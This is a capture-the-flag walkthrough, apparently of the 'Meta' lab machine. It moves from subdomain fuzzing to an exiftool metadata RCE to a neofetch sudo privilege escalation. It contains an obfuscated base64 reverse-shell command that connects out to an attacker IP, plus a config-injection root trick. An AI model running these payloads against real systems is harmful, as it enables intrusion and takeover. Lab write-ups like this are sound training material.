# Enumration

### Nmap Scan
```shell-session
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumration
On exploring web surface we didn't got much so moving on to fuzzing sub-domains.

```shell-session
──(kali㉿kali)-[~/Desktop/mata]
└─$ ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://artcorp.htb/ -H "Host: FUZZ.artcorp.htb" -fw 1  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://artcorp.htb/
 :: Wordlist         : FUZZ: subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.artcorp.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1
________________________________________________

dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10]
:: Progress: [4989/4989] :: Job [1/1] :: 122 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```

We got  a sub-domain `dev01` lets jump into that.

We see that it's simply printing all the **meta-data** of uploaded picture with some tag either removed or not shown.

Exploring more on this I find out we can achieve RCE from this function.
+ [JPEG RCE | Github](https://github.com/OneSecCyber/JPEG_RCE)

Forming Payload to get a reverse shell

```shell
┌──(kali㉿kali)-[~/Desktop/mata/JPEG_RCE]
└─$ exiftool -config eval.config C -eval='system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvOTAwMSAwPiYxCg== | base64 -d | bash")'
    1 image files updated
```

# Getting User
Using `pspy32` tool find any process that might lead us to root.

```shell
/bin/bash /usr/local/bin/convert_images.sh 
2022/02/03 06:11:01 CMD: UID=1000 PID=6769   | /usr/local/bin/mogrify -format png *.* 
2022/02/03 06:11:01 CMD: UID=1000 PID=6770   | pkill mogrify
```

Reading this `convert_images.sh`

```shell
www-data@meta:/tmp$ cat /usr/local/bin/convert_images.sh
cat /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify

/bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf
```

[ImageMagic Shell Injection via PDF](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)

# Privilege Escalation

On doing `sudo -l` we have `env_keep+=XDG_CONFIG_HOME` and we can run `/usr/bin/neofetch \\` with no parameters.

Searching about that environment variable  [debian - Where should the XDG_CONFIG_HOME variable be defined? - Super User](https://superuser.com/questions/365847/where-should-the-xdg-config-home-variable-be-defined) 

Therefore on running `sudo /usr/bin/neofetch \\` the config file of user **Thomas** will we used from it's home directory `/home/thomas/.config`

```bash
$ export XDG_CONFIG_HOME=/home/thomas/.config

$ echo "/bin/sh" >> /home/thomas/.config/config.conf
```

